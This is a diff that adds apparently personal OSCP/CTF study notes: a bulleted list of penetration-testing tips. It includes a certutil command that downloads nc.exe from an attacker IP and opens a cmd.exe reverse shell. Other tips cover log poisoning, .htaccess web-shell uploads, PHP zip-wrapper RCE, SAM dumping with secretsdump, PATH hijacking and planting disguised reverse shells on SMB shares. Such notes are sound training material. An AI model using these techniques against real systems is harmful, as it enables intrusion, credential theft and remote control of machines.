@@ -1,0 +1,85 @@
+Here is the reformatted content with each point preceded by a dash and placed on a new line:
+
+---
+
+## Takeaways from Experience
+
+- Jaws, privesccheck.ps1 are worth running if you're completely stuck.
+- When in doubt, new technology, unfamiliar port, check hack tricks. Sweetpotato & god potato.
+- How to know which version of Net (for sharp collection)?
+- Laps, read admin password.
+- When testing for SSTI, try {{7*7}}.
+- /var/tmp/payload.sh is best guess.
+- Always run pspy, especially if a cronjob is running.
+- Pkexec->pwnkit.
+- If you see a Pyc file, especially if it is in an interesting location, decompile it and view the code.
+- If your file upload attack just isn't working, check if you can upload .htaccess, find where it’s saved, and then upload webshell (AddType application/x-httpd-php .genius or .anymadeupname).
+- SeManageVolumeExploit.exe.
+- Check headers for windows api when you're submitting information in a form, especially a link, then set up responder and try to capture hashes when it hits your tun0.
+- A reliable way to get shell on Windows is to transfer nc.exe and do a simple nc reverse shell, same as the one from hacktricks god potato.
+- If you're in a Windows database server, and you're trying to communicate out, 8082 is the outbound database port, use this if transferring from database.
+- Simple way to get more information about files in directory, such as who owns them: 'dir /a /o /q'
+- If you see a lot of custom content on a CTF website, you should use cewl and create a custom wordlist.
+- Always fuzz php parameters in browser if you get the opportunity (find S1RENs offsec walkthrough).
+- Say that you're within the system, and you're trying to get in as www, you can poison the logs of /proc/self/environ, /var/log/auth.log, or access.log and then do ?&cmd=payload.
+- Run ls -lsa in ftp so that you don't skip over hidden files.
+- Btop is a cooler version of htop.
+- Be aware that you need to use a -sT tcp connect scan to scan certain proxies.
+- If you can’t ls inside of directory, try getfacl & potentially cat the files inside.
+- Even if directory is 403, you can FUZZ past it. nmap —script=smb-enum-shares.
+- Write permissions for smb? -> upload revshell in disguise. Look for files that you know people are going to click on, ideally replacing those.
+- Joomla->joom scan.
+- Always look up vulnerabilities, even for seemingly homemade software (check the tab title).
+- Make sure to spray usernames as passwords as well (in another cat file).
+- Always check for default credentials.
+- If stagless shell isn’t working, try a staged one.
+- Read through the entire exploit code, there may be a little comment that means everything.
+- If you’re getting a little functionality or progress with a PoC, but it doesn’t ultimately work, try another one (or two).
+- If a machine is slow, revert it right away.
+- Run "dig any website.offsec @IP" to query more information about the DNS server.
+- When doing the "php://filter/convert.base64-encode/resource=index" thing, look for included files in the code, and then replace the value, in this case, index, to keep investigating code.
+- If you're in a situation where you can upload a zip file, there's a php module where you can make the server read it, "192.168.234.229/index.php?file=zip://uploads/upload_1715711517.zip#rev" (https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/?source=post_page-----b49a52ed8e38--------------------------------).
+- If nothing is working on a file upload, you can try to overwrite their .htaccess file with your own, "AddType application/x-httpd-php .genius"
+- If you're ever able to run into the SAM or SYSTEM files in Windows smb or filesystem, run "impacket-secretsdump -sam SAM -system SYSTEM LOCAL".
+- If you have credentials for another user on a system, but cannot seem to login as them through any of the traditional methods, use the "Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "<reverse shell code>"" and execute a reverse shell to get onto the system as them.
+- If a normal bash reverse shell doesn't work in a php command, try encoding it and setting the port to 443 or 80.
+- Always try password reuse, even and especially in mysql. This should be automatic. Create a script that you can run with netexec that automatically runs the gauntlet whenever you get any new creds, even if they are just prospective. Be aware of the lockout policy.
+- Try to upload a malicious plugin for WordPress, or any CMS, if possible. CMSs also cry for public exploits in the CTF world.
+- If you have access to the files in /var/www/html/ and there's a website that you are unable to access, whether it be on the loopback or not, configure the website code where you can login.
+- Check if you have access to the webroot with SMB so you can put a web shell in there.
+- Always search through history files, for kdbx, and txt files.
+- Always try ftp with the username anonymous and the password anonymous.
+- If you have a resolved domain, always add it to your hosts file, then test for subdomains with "gobuster dns -d relia.com -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30", with the weird open http port that you found (if relevant), "http://web02.relia.com:14080/".
+- If one exploit isn't doing the job, check out another one, if that doesn't work, there are some great exploits that are available on GitHub through Google. Blogs that walk you through exploits are awesome and help understand the vulnerability you're facing, which helps you personalize it to your situation.
+- If the executable that runs the msfvenom path doesn't work, try the other c code that creates an admin user on the system.
+- Always check out exploits for Apache and the other web technologies. It's crazy how often these pop up.
+- Always check for alternative file names, in the case of id_rsa, check for ".ssh/id_dsa, .ssh/id_ecdsa, .ssh/id_ed25519, .ssh/authorized_keys". Note that nmap should show you which keys they are using.
+- If possible, always compile the exploit on the target machine. Only do it on your machine (in the CTF context) if you run into a gajillion issues.
+- Whenever you see a question mark in the URL, think LFI, PHP wrappers, SQLi.
+- If you have LFI and can already get a shell on the server, plant a reverse shell in the web root and execute it through the LFI.
+- If you're stuck on a Linux system, use pspy.
+- Find a way to upload document to ANY directory in the webroot, always recursively search for directories.
+- Try all of the netexec enumeration commands to verify credentials, explore vectors. Create a script to do do.
+- When using wget in a payload, don't do http://$IP.. leave out the 'http://'. There was a payload that didn't work when you kept the http://.
+- If nc isn't working for a revshell, and there are common variables to what you saw with the Berlin box, aka spring boot and java, try adding "busybox" in front of the command. Revshells.com has a version.
+- For port 8443, use a hostname with HTTPS instead of HTTP. (Face palm).
+- Say that you upload a web or reverse shell on one port (example 8443), the method of accessing it may be through one of the other port (such as 8000). Enumerate to find place the wwwroot.
+- If there is a URL input on a Windows server, try to ping your own server and capture the hash with responder.
+- When there is a URL input, instead of accessing your python server, you can create an impacket smb server and get a file through that method. For some reason, this works sometimes while the python server does not.
+- If you get credentials, you should always rewind and try to log in the original services that you were trying to enumerate, such as ftp where you can place a shell in the webroot. This has come up again and again.
+- Assume that the name of the box is a username on the system.
+- Do you need to have the id_rsa.pub in your directory? not only the private key? try pub 666 priv 600.
+- If there are any weird binaries that stick out, especially if they have suids or guids set, run a string against them and check whether they have any relative paths that you can hijack. you could simply modify the path (put a writable directory at the front) & put a reverse shell in the writable directory which the same name. just make sure to change the permissions to make it executable
+- Start at the smaller attack surfaces, and work your way to the larger ones if need be.
+- If you can upload/overwrite files, try to add a modified /etc/passwd with you in there, whenever you can, always do "../../../../../../../../etc/passwd" to avoid risking a lot of your time.
+- If anything has a password, and you can't get into it, hashcat can probably crack it.. I made this mistake with the zip file.. it's worth a search to find out if it is possible.
+- Whenever you're facing an exposed .git repository, try using git-dumper to ease the process.
+- Sometimes you're unable to ssh into a user with the password that you have, and instead, have to 'su username' to login as that user. Do not forget to do this.
+- If something seems out of the ordinary, attack the fuck out of it. The more experience you have, the better instincts you will have.
+- Always check the SAM if there's any sort of backup or loose permissions in SMB.
+- Dumping secrets is mainstream knowledge, stop slackin' (C:\windows.old\windows\system32\SAM & SYSTEM>) -> "/usr/local/bin/secretsdump.py -sam SAM -system SYSTEM LOCAL".
+- If you can see that your shell is not maintaining, try modifying the exploit code to suit your needs. In this case, I downloaded and ran nc.exe. "certutil.exe -urlcache -split -f http://192.168.45.195:443/nc.exe C:\Windows\Tasks\nc.exe & C:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.195 80" instead of typing the command as a parameter to the exploit.
+- For any weird port, search up related exploit along with any fingerprint that you have to narrow down results.
+- If there's a weird port, such as cgms 3003, try to connect to it and get the version "nc -zv $IP -> help -> version -> search exploit". If this makes no sense you can also refer to "https://github.com/xsudoxx/OSCP".
+- Always search for exploits using terms as vague as possible, then narrow down afterwards, this way you don't miss something.
+- If you have problems compiling an exploit on a target, try doing it on your local computer.
